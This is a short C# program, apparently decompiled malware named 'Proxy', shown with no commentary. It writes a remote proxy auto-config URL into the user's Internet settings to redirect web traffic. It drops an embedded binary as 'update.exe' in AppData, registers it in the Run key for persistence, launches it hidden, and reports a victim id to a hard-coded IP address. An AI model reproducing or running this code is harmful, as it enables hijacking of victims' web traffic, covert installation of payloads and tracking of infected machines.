using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Threading;
using Microsoft.Win32;
using Proxy.Properties;

namespace Proxy;

internal class Program
{
	private static void Main(string[] args)
	{
		string text;
		try
		{
			text = args[0];
		}
		catch (Exception)
		{
			text = "oops";
		}
		Process.Start("Reg", " Add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /V AutoConfigURL /D http://reestru.net/proxy.pac /F");
		Thread.Sleep(3000);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = WriteBin(folderPath + "\\update.exe", Resources.Windows_Service);
		registryKey?.SetValue("Update", folderPath);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = folderPath;
		ProcessStartInfo startInfo = processStartInfo;
		Process.Start(startInfo);
		Process.Start("http://194.247.12.106/add.php?id=" + text);
	}

	private static string WriteBin(string name, byte[] file)
	{
		File.WriteAllBytes(name, file);
		return name;
	}
}
